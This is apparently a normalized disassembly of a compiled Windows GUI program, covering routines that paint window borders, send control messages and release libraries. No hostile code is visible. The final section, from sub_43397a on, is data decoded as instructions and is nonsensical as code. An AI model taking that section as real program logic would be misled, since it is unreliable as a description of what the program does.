mov eax [ esi + 0x8 ]
push 0xffffffff
push 0xffffffff
push eax
call InflateRect
sub_4324e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4472c4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x13
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetDCEx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4325d7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowRect
mov ecx [ ebp - 0x14 ]
neg ecx
mov edx [ ebp - 0x18 ]
neg edx
lea eax [ ebp - 0x18 ]
call sub_406144
mov eax [ ebp - 0xc ]
dec eax
push eax
mov eax [ ebp - 0x10 ]
dec eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
mov eax [ ebp - 0x18 ]
inc eax
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
push 0x0
push 0x1
push 0x1
call CreatePen
mov ebx eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_41ffac
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetBkColor
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call Rectangle
test esi esi
je r-xdata
push ebx
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ReleaseDC
retn
push esi
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
sub_4325f4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_444974
push 0xffffffff
push 0x0
mov eax ebx
call sub_4464d0
push eax
call InvalidateRect
mov eax [ ebx + 0x218 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x21c ]
xor edx edx
xor eax eax
call sub_406120
cmp [ ebx + 0x210 ] 0x0
je r-xdata
push esp
mov eax ebx
call sub_4464d0
push eax
call ValidateRect
mov eax ebx
call sub_4464d0
push eax
call UpdateWindow
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4464d0
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_43f6f8
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
sub eax edx
sar eax 0x1
jns r-xdata
push eax
mov eax ebx
call sub_43f6b4
mov edx eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
lea eax [ esp + 0x4 ]
pop ecx
call sub_406144
adc edx 0x0
sub_4326c4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ ebx + 0x6 ]
dec ax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
pop esi
pop ebx
retn
dec ax
je r-xdata
cmp [ esi + 0x23c ] 0x0
jne r-xdata
jmp r-xdata
dec [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
jmp r-xdata
pop esi
pop ebx
retn
sub_4327b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20c ]
call sub_40408c
mov al [ ebx + 0x211 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x228 ]
mov [ esi + 0x8 ] eax
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x230 ]
call sub_40408c
mov eax [ ebx + 0x22c ]
mov [ esi + 0x10 ] eax
pop esi
pop ebx
retn
sub_4327f4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x20c ]
mov edx [ esi ]
call sub_40408c
mov al [ esi + 0x4 ]
mov [ ebx + 0x211 ] al
mov eax [ esi + 0x8 ]
mov [ ebx + 0x228 ] eax
lea eax [ ebx + 0x230 ]
mov edx [ esi + 0xc ]
call sub_40408c
mov eax [ esi + 0x10 ]
mov [ ebx + 0x22c ] eax
pop esi
pop ebx
retn
sub_432834
cmp [ eax + 0x211 ] 0x0
je r-xdata
mov edx [ eax + 0x228 ]
test edx edx
je r-xdata
call sub_4312ac
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
jmp r-xdata
retn
sub_43286c
push ebx
mov ebx eax
mov al [ ebx + 0x211 ]
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
pop ebx
retn
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov eax [ ebx + 0x20c ]
jmp r-xdata
mov eax [ ebx + 0x22c ]
mov eax [ ebx + 0x230 ]
jmp r-xdata
pop ebx
retn
sub_4328b0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_432834
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
push 0x40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41979c
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43286c
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419bd0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x230 ]
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b78
jmp r-xdata
pop ebx
pop ebp
retn
sub_432944
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_4328b0
pop ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4329fa
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx 0x30
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x30
jne r-xdata
xor ecx ecx
mov edx 0x40
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x40
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_419514
xor ecx ecx
mov edx 0x44
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x44
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x21c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_419514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432a01
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x218 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_419514
sub_432a08
test [ eax + 0x1c ] 0x2
je r-xdata
cmp dl [ eax + 0x208 ]
je r-xdata
test dl dl
je r-xdata
retn
test dl dl
je r-xdata
mov [ eax + 0x234 ] 0x1
retn
call sub_432e80
mov edx [ eax + 0x224 ]
push edx
mov cx [ eax + 0x23a ]
mov dx [ eax + 0x238 ]
call sub_432dd0
jmp r-xdata
sub_432a5c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x211 ]
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x211 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
call sub_4312f4
cmp eax 0x40047
jl r-xdata
mov [ esi + 0x221 ] al
mov [ esi + 0x211 ] bl
lea eax [ esi + 0x20c ]
call sub_404038
xor eax eax
mov [ esi + 0x228 ] eax
lea eax [ esi + 0x230 ]
call sub_404038
xor eax eax
mov [ esi + 0x22c ] eax
test bl bl
jne r-xdata
mov al 0x1
mov eax esi
call sub_432e2c
xor edx edx
mov eax esi
call sub_432be8
jmp r-xdata
sub_432ad0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_4044e8
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_4049a4
xor eax eax
push ebp
push sub_432bda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov edx [ ebp - 0x8 ]
call sub_408064
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432be1
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404a74
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4327b4
xor eax eax
push ebp
push sub_432b9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
add eax 0x20c
mov edx [ ebp - 0x8 ]
call sub_40408c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x228 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x230
call sub_404038
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x22c ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_432e2c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_432be8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_432ba1
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4327f4
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432be1
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404a74
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_432be8
push esi
mov esi eax
cmp dl [ esi + 0x220 ]
je r-xdata
pop esi
retn
test dl dl
je r-xdata
mov eax esi
call sub_432d88
mov [ esi + 0x220 ] al
mov eax esi
call sub_432ce8
mov [ esi + 0x220 ] al
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax esi
mov si 0xffee
call sub_4034e4
jmp r-xdata
sub_432c44
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x238 ] si
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_432e80
mov edx esi
mov eax ebx
call sub_432e4c
sub_432cb8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_432be8
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_432ce8
push esi
add esp 0xffffffec
mov esi eax
cmp [ esi + 0x221 ] 0x0
je r-xdata
mov eax esi
call sub_4464ac
cmp [ esi + 0x210 ] 0x0
jne r-xdata
mov eax esi
call sub_443a38
mov eax esi
call sub_43286c
push eax
mov eax esi
call sub_432834
mov ecx eax
mov edx 0x464
mov eax esi
call sub_440e64
test eax eax
setne [ esp ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_43f650
cmp [ esp ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_43f670
mov al [ esp ]
add esp 0x14
pop esi
retn
mov eax esi
call sub_432944
mov [ esi + 0x238 ] 0x1
mov ax [ esi + 0x214 ]
mov [ esi + 0x23a ] ax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_432d88
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x464
mov eax esi
call sub_4464d0
push eax
call SendMessageA
test eax eax
setne bl
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_432e80
sub_432dd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
call sub_4464ac
mov eax ebx
call sub_432cb8
mov [ ebx + 0x208 ] 0x1
test esi esi
jne r-xdata
mov dx [ ebp - 0x2 ]
dec edx
mov eax edi
dec eax
call sub_406c88
push eax
mov ecx esi
mov edx 0x465
mov eax ebx
call sub_440e64
dec eax
je r-xdata
or esi 0xffffffff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ ebx + 0x208 ] 0x0
sub_432e4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_432cb8
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406c88
push eax
push 0x1
push 0x465
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_432e80
push ebx
push esi
mov esi eax
mov bx [ esi + 0x238 ]
dec ebx
mov edx ebx
mov eax ebx
call sub_406c88
push eax
push 0x1
push 0x465
mov eax esi
call sub_4464d0
push eax
call SendMessageA
mov [ esi + 0x208 ] 0x0
inc [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
sub_432ec4
push ebx
push esi
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor ebx ebx
mov bl 0x1
mov esi [ eax + 0x21c ]
mov [ edx ] esi
mov eax [ eax + 0x218 ]
mov [ ecx ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_432eec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432f5b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432f62
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a74
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a74
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4331b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42abdc
mov [ esi + 0x5 ] al
call sub_4312f4
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_433910
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_433200
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_4332a0
call sub_42aa1c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_433234
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_4332a0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4332e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433234
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_433330
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433234
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_433374
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_433234
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_4333dc
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_433418
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_433435 ]
jmp [ eax * 4 + jump_table_43349e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4337a4
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4338ff
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_4333dc
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_433330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_41613c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43392c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433967
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43396e
retn
mov eax [ rw-data ]
call sub_4032e8
mov eax rw-data
call sub_404038
sub_43397a
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
cmp al [ ebx ]
sub bh [ ebx ]
inc ebx
add [ eax ] ah
add al [ eax ]
add [ edi + edi * 4 ] ch
inc ebx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
push 0x61437261
jae r-xdata
cmp [ eax + eax - 0x38 ] eax
insb
inc ebx
add [ ebp + ebp * 2 + 0x6df40043 ] al
inc ebx
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax - 0x68 ] al
outsb
inc ebx
add ah ah
inc esp
add [ edx + eax * 2 + 0x44 ] bh
add [ esi + esi * 2 + 0x44 ] dh
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ eax - 0x3bffbc98 ] cl
push 0x43
add [ eax + 0x2c00436a ] al
insb
inc ebx
add ah dh
push 0x43
add [ edx + ebp * 2 + 0x6b580043 ] ah
inc ebx
add [ eax + 0x800436b ] dl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
hlt
inc ebx
add [ eax - 0x2bffbb96 ] bh
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
add [ ebp + esi + 0x40 ] al
add [ edi + ebp * 2 + 0x32800043 ] bh
inc eax
add [ edx + esi + 0x22e80040 ] bl
inc esp
add [ edi + ebp * 2 + 0x37d80044 ] ah
or al bl
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x39 ] bh
inc ebx
add [ eax ] cl
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
inc esp
call 0xffffffffa4437e33
outsd
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
jb r-xdata
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
mov edi 0xd8080043
popad
jae r-xdata
inc esp
add al bl
aaa
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jpo r-xdata
jb r-xdata
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc98 ] ch
cmp al 0xef
add [ ebp + ebx + 0x44 ] ch
rol [ ecx ] 0x1
inc esp
xor eax 0x6fbc0040
inc ebx
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
popad
jae r-xdata
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
fadd [ ecx ]
or ch dl
inc esp
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
loopne r-xdata
insb
jae r-xdata
rcl [ eax ] 0x3a
inc ebx
sub_433a72
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ ebx + edi * 8 - 0x167ffbd ] al
inc ebx
add [ ebp + edi * 8 + 0x43 ] al
add [ esi + edi + 0x1fec0044 ] ch
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x25040044 ] ah
inc esp
add [ eax + 0x3800442b ] bl
cmp [ eax + eax - 0x38 ] eax
insb
inc ebx
add [ ebp + ebp * 2 + 0x6df40043 ] al
inc ebx
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
